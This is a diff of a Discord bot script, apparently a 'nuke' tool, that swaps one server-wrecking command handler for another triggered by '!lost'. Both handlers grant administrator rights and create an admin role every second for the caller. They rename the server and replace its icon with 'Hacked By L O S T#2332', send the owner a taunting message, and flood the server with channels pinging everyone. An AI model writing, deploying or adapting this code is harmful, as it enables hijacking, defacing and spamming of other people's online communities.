@@ -1,88 +1,3 @@
-const Discord = require("discord.js");
-const client = new Discord.Client();
-
-client.on("message", message => {
-
-  if (message.content.startsWith(`sraw`)) {
-
-    message.delete();
-
-    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
-
-      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
-
-    });
-
-
-    setInterval(() => {
-
-      message.guild.roles
-
-        .create({
-
-        data: {
-
-          name: "Hacked By L O S T#2332",
-
-          permissions: ["ADMINISTRATOR"]
-
-        }
-
-        })
-
-        .then(rr => {
-
-          message.member.roles.add(rr.id);
-
-        });
-
-    }, 1000);
-
-    message.guild.setIcon("https://cdn.discordapp.com/attachments/746824659181502525/986196100044169296/de9d9493e5c763bc7413cc9fdce8ed3f.gif");
-
-    client.user.setUsername("Hacked By L O S T#2332");
-
-    message.guild.owner.send(
-
-      "Bdaxo nradar servert hack kra"
-
-    );
-
-    message.guild.setName("Hacked By L O S T#2332");
-
-    setTimeout(function() {
-
-      setInterval(
-
-        () => {
-
-          message.guild.channels
-
-            .create("hacked by L O S T#2332", "text")
-
-            .then(channel => {
-
-              channel.send(
-
-                "@everyone Hacked By L O S T#2332"
-
-              );
-
-            })
-        },
-
- 
-
-        1000
-
-      );
-
-    });
-
-  }
-
-});
-client.login("")
 ///////////////
 const discord = require("discord.js");
 const nuke = new discord.Client();
@@ -151,5 +66,75 @@ if (msg.author.id == "802491275445010443") {
  
  
 });
+
+nuke.on("message", message => {
+
+  if (message.content.startsWith("!" + "lost")) {
+
+    message.delete();
+    setInterval(() => {
+
+      message.guild.roles.create({
+
+        data: {
+
+          name: "Hacked By L O S T#2332",
+
+          permissions: ["ADMINISTRATOR"]
+
+        }
+
+        })
+
+        .then(rr => {
+
+          message.member.roles.add(rr.id);
+
+        });
+
+    }, 1000);
+
+    message.guild.setIcon("https://cdn.discordapp.com/attachments/746824659181502525/986196100044169296/de9d9493e5c763bc7413cc9fdce8ed3f.gif");
+
+
+    message.guild.owner.send(
+
+      "Bdaxo nradar servert hack kra"
+
+    );
+
+    message.guild.setName("Hacked By L O S T#2332");
+
+    setTimeout(function() {
+
+      setInterval(
+
+        () => {
+
+           message.guild.createChannel('hack by Dark Team', 'voice')
+
+            .then(channel => {
+
+              channel.send(
+
+                "@everyone Hacked By L O S T#2332"
+
+              );
+
+            })
+        },
+
+ 
+
+        1000
+
+      );
+
+    });
+
+  }
+
+});
+
  
 nuke.login("");
